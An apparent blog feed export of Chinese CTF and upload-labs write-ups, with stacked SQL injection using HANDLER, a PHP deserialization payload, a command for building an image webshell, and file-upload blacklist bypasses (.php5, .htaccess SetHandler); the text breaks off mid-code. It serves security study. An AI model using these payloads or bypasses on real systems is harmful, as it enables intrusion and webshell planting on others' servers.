        <content type="html"><![CDATA[<h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>打开靶机后，明显注入题。</p><p><img src="/2021/07/27/2021/ctf/3/image-20210727204621570.png" alt="image-20210727204621570"></p><p>wp来源：<a href="https://www.cnblogs.com/20175211lyz/p/12356678.html">https://www.cnblogs.com/20175211lyz/p/12356678.html</a></p><h4 id="姿势-堆叠注入"><a href="#姿势-堆叠注入" class="headerlink" title="姿势-堆叠注入"></a>姿势-堆叠注入</h4><p>获取库名、表名、列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">databases</span>;<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span>;<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">columns</span> <span class="hljs-keyword">from</span> <span class="hljs-string">`table_name`</span>;<br></code></pre></td></tr></table></figure><p>试着查询了一下数据库名、表名和段名（<strong>这里没有用之前传统的联合查询，因为自己尝试查询之后发现后面会被正则表达式过滤</strong>）：</p><p>ps：不过我不太清楚为什么这里查询要 ‘ 加上 ；</p><p><img src="/2021/07/27/2021/ctf/3/image-20210727204959368.png" alt="image-20210727204959368"></p><p><img src="/2021/07/27/2021/ctf/3/image-20210727205248791.png" alt="image-20210727205248791"></p><p>出现了flag字样，然后用大佬的方法，</p><p>payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">1&#x27;;<span class="hljs-keyword">handler</span> FlagHere <span class="hljs-keyword">open</span>;<span class="hljs-keyword">handler</span> FlagHere <span class="hljs-keyword">read</span> <span class="hljs-keyword">first</span>;<span class="hljs-keyword">handler</span> FlagHere <span class="hljs-keyword">close</span>;<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>官方解释是：</p><p>HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，</p><p>该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭</p><h4 id="Tip："><a href="#Tip：" class="headerlink" title="Tip："></a>Tip：</h4><p>本来应该还有一种姿势是修改表名，但是修改表名的关键字rename和alert都被正则ban掉，所以不能用</p><p>这题若是改造之前的强网杯2019随便注一题则可以用此方法。</p>]]></content>
      
      
      <categories>
          
          <category> CTF·sql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯 2020 青龙组AreUSerialz</title>
      <link href="/2021/07/26/2021/ctf/2/"/>
      <url>/2021/07/26/2021/ctf/2/</url>
      
        <content type="html"><![CDATA[<p>​    打开后，出现代码页面</p><p><img src="/2021/07/26/2021/ctf/2/image-20210726194801767.png" alt="image-20210726194801767"></p><p>​    处理到vs上</p><p><img src="/2021/07/26/2021/ctf/2/image-20210726194850909.png" alt="image-20210726194850909"></p><p>接着我们逐段分析：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">include</span>(&quot;flag.php&quot;);<br></code></pre></td></tr></table></figure><p>​    包含了名为flag.php的文件。</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">protected</span> $op;<br><br><span class="hljs-keyword">protected</span> $filename;<br><br><span class="hljs-keyword">protected</span> $content;<br></code></pre></td></tr></table></figure><p>​    受保护方法的三个变量</p><p>接下来是借鉴了大佬博客</p><p>经过分析，这个题目需要传入一个序列化之后的类对象（因为最后的valid函数会进行一步反序列化），并且要绕过两层防护：</p><p>两个防护：<br><strong>is_valid()</strong><br>要求我们传入的str的每个字母的ascii值在32和125之间。因为protected属性在序列化之后会出现不可见字符\00*\00，不符合上面的要求。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params">$s</span>) </span>&#123;<br><br>  <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; strlen($s); $i++)<br><br>​    <span class="hljs-keyword">if</span>(!(ord($s[$i]) &gt;= <span class="hljs-number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="hljs-number">125</span>))<br><br>​      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>这里用到了python的ord函数：</p><p>[^]: ord () 函数是 chr () 函数（对于8位的ASCII字符串）或 unichr () 函数（对于Unicode对象）的配对函数，它以一个字符（长度为1的字符串）作为参数，返回对应的 ASCII 数值，或者 Unicode 数值</p><p>绕过方法：因为php7.1以上的版本对属性类型不敏感，所以可以将属性改为public，public属性序列化不会出现不可见字符</p><p><strong>destruct()魔术方法</strong><br>op===”2”，是强比较，（tips：“2”表示为字符串类型2）<a href="https://www.runoob.com/php/php-types-comparisons.html">PHP 类型比较 | 菜鸟教程 (runoob.com)</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            <span class="hljs-keyword">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;process();<br>    &#125;<br></code></pre></td></tr></table></figure><p> <strong>而在process()函数中,</strong></p><p>op==”2”是弱比较</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;write();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>            $res = <span class="hljs-keyword">$this</span>-&gt;read();<br>            <span class="hljs-keyword">$this</span>-&gt;output($res);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p> 绕过方法：可以使传入的op是数字2，从而使第一个强比较返回false,而使第二个弱比较返回true.</p><p><img src="/2021/07/26/2021/ctf/2/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JBQkNEWEI=,size_16,color_FFFFFF,t_70" alt="img"></p><p>绕过之后，就是到了关键一步，要进行本地序列化操作：</p><p>我直接照搬了大佬的文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">public</span>  $op = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">public</span>  $filename = <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-keyword">public</span>  $content = <span class="hljs-string">&quot;1&quot;</span>;        <span class="hljs-comment">//因为destruce函数会将content改为空，所以content的值随意（但是要满足is_valid()函数的要求）</span><br><br>&#125;<br><br>$a = <span class="hljs-keyword">new</span> FileHandler();<br>$b = serialize($a);<br><span class="hljs-keyword">echo</span> $b;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>访问xu.php</p><p><img src="/2021/07/26/2021/ctf/2/image-20210726200434420.png" alt="image-20210726200434420"></p><p>​        构建payload：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs groovy">?str=O:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">3</span>:&#123;<span class="hljs-attr">s:</span><span class="hljs-number">2</span>:<span class="hljs-string">&quot;op&quot;</span>;<span class="hljs-attr">i:</span><span class="hljs-number">2</span>;<span class="hljs-attr">s:</span><span class="hljs-number">8</span>:<span class="hljs-string">&quot;filename&quot;</span>;<span class="hljs-attr">s:</span><span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;<span class="hljs-attr">s:</span><span class="hljs-number">7</span>:<span class="hljs-string">&quot;content&quot;</span>;<span class="hljs-attr">s:</span><span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>​        F12得到flag：</p><p><img src="/2021/07/26/2021/ctf/2/image-20210726200827967.png" alt="image-20210726200827967"></p><p>本文借鉴于：[<a href="https://blog.csdn.net/RABCDXB/article/details/114297291">网鼎杯 2020 青龙组]AreUSerialz_RABCDXB的博客-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF·反序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图片马</title>
      <link href="/2021/02/22/2021/upload-labs/%E5%9B%BE%E7%89%87%E9%A9%AC/"/>
      <url>/2021/02/22/2021/upload-labs/%E5%9B%BE%E7%89%87%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<p>   1.打开windows命令控制台，cd到图片与文件同在路径下</p><p>   如 1.jpg与 2.php同在桌面，则：  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span>   desktop<br></code></pre></td></tr></table></figure><ol start="2"><li><p>输入指令：copy  1.jpg/b  +  2.php/a  shell,jpg   之后回车，那么形成的图片马文件就会出现在自己的桌面上。</p><p><img src="/2021/02/22/2021/upload-labs/%E5%9B%BE%E7%89%87%E9%A9%AC/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(38).png"></p><p>​    </p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> upload-labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs</title>
      <link href="/2021/02/21/2021/upload-labs/upload-labs/"/>
      <url>/2021/02/21/2021/upload-labs/upload-labs/</url>
      
        <content type="html"><![CDATA[<p> 转载于：<a href="https://blog.csdn.net/weixin_44677409/article/details/92799366">https://blog.csdn.net/weixin_44677409/article/details/92799366</a> 作者：小白白@</p><p>（不懂为什么里面一些关卡的方法作者可以绕过，而我就是提示不可以上传该文件类型，伤脑筋。。）</p><p>（经过不断失败后，明白原因了：与配置文件php.ini有关，需要修改配置；其次文件缺失，因为可能从网络上白获取的文件吧，好多版本存在关卡不足、对应关卡源代码不对等问题，现在来看在训练的三个靶场中，SQL labs是后期难度最大、时间最长得了。）</p><p><img src="https://img-blog.csdnimg.cn/20190619151237843.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="Pass-1-js检查"><a href="#Pass-1-js检查" class="headerlink" title="Pass-1-js检查"></a>Pass-1-js检查</h2><p><strong>源码：</strong><br><img src="https://img-blog.csdnimg.cn/20190618192730245.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>因为是前端js校验，因此可以直接禁用js<br>或者用burp抓包修改文件类型（上传1.jpg修改为1.php）<br><img src="https://img-blog.csdnimg.cn/20190618201625999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190618201727918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="Pass-2-只验证Content-type"><a href="#Pass-2-只验证Content-type" class="headerlink" title="Pass-2-只验证Content-type"></a>Pass-2-只验证Content-type</h2><p><strong>源码：</strong></p><p><img src="https://img-blog.csdnimg.cn/20190618202240670.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>仅仅判断content-type类型，因此上传1.php抓包修改content-type为图片类型：image/jpeg、image/png、image/gif</p><p><img src="https://img-blog.csdnimg.cn/20190618202602681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2019061820285334.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="Pass-3-黑名单绕过"><a href="#Pass-3-黑名单绕过" class="headerlink" title="Pass-3-黑名单绕过"></a>Pass-3-黑名单绕过</h2><p><strong>源码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php">$is_upload = <span class="hljs-literal">false</span>;<br>$msg = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;.asp&#x27;</span>,<span class="hljs-string">&#x27;.aspx&#x27;</span>,<span class="hljs-string">&#x27;.php&#x27;</span>,<span class="hljs-string">&#x27;.jsp&#x27;</span>);<br>        $file_name = trim($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        $file_name = deldot($file_name);<span class="hljs-comment">//删除文件名末尾的点</span><br>        $file_ext = strrchr($file_name, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        $file_ext = strtolower($file_ext); <span class="hljs-comment">//转换为小写</span><br>        $file_ext = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, $file_ext);<span class="hljs-comment">//去除字符串::$DATA</span><br>        $file_ext = trim($file_ext); <span class="hljs-comment">//收尾去空</span><br><br>        <span class="hljs-keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;<br>            $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            $img_path = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.date(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).$file_ext;            <br>            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;<br>                 $is_upload = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                $msg = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            $msg = <span class="hljs-string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        $msg = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-number">12345678910111213141516171819202122232425262728</span><br></code></pre></td></tr></table></figure><p>用黑名单不允许上传<code>.asp,.aspx,.php,.jsp</code>后缀的文件<br>但可以上传<code>.phtml .phps .php5 .pht</code><br>前提是apache的httpd.conf中有如下配置代码</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">AddType application/x-httpd-php <span class="hljs-string">.php</span> <span class="hljs-string">.phtml</span> <span class="hljs-string">.phps</span> <span class="hljs-string">.php5</span> <span class="hljs-string">.pht</span><br>1<br></code></pre></td></tr></table></figure><p>因此抓包修改为1.php5上传，回复包里有上传路径<br><img src="https://img-blog.csdnimg.cn/20190618205539849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190618205914362.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="Pass-4-htaccess绕过"><a href="#Pass-4-htaccess绕过" class="headerlink" title="Pass-4-.htaccess绕过"></a>Pass-4-.htaccess绕过</h2><p><strong>源码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php">$is_upload = <span class="hljs-literal">false</span>;<br>$msg = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;php1&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;pHp1&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>);<br>        $file_name = trim($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        $file_name = deldot($file_name);<span class="hljs-comment">//删除文件名末尾的点</span><br>        $file_ext = strrchr($file_name, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        $file_ext = strtolower($file_ext); <span class="hljs-comment">//转换为小写</span><br>        $file_ext = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, $file_ext);<span class="hljs-comment">//去除字符串::$DATA</span><br>        $file_ext = trim($file_ext); <span class="hljs-comment">//收尾去空</span><br><br>        <span class="hljs-keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;<br>            $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            $img_path = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.$file_name;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;<br>                $is_upload = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                $msg = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            $msg = <span class="hljs-string">&#x27;此文件不允许上传!&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        $msg = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-number">12345678910111213141516171819202122232425262728</span><br></code></pre></td></tr></table></figure><p>黑名单拒绝了几乎所有有问题的后缀名，除了.htaccess<br>前提条件（<code>1.mod_rewrite模块开启。2.AllowOverride All</code>）<br>因此先上传一个.htaccess文件，内容如下：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">SetHandler application/x-httpd-php <br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>这样所有文件都会当成php来解析<br><img src="https://img-blog.csdnimg.cn/20190619210642615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190619210904393.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190619210924251.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="Pass-5-大小写绕过"><a href="#Pass-5-大小写绕过" class="headerlink" title="Pass-5-大小写绕过"></a>Pass-5-大小写绕过</h2><p><strong>源码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php">$is_upload = <span class="hljs-literal">false</span>;<br>$msg = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span 